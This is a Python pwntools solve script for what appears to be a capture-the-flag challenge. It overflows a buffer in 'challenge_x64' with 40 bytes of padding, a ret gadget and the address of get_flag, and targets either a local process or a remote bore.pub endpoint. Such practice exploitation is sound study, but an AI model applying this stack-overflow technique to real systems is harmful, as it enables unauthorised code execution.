from pwn import *

elf = ELF('./challenge_x64')
context.binary = elf

offset = 40
ret_address = 0x0040101a
flag_address = elf.sym['get_flag']  # 0x401276

payload = b'A' * offset
payload += pack(ret_address)
payload += pack(flag_address)

# Run locally by default, or with `python solve.py REMOTE` for remote bore tunnel
if args.REMOTE:
    p = remote('bore.pub', 31338)
else:
    p = process('./challenge_x64')

# Send 1 after receive '>'
p.sendlineafter(b'>', b'1')

# Send payload after getting 'name?'
p.sendlineafter(b'name? ', payload)

p.interactive()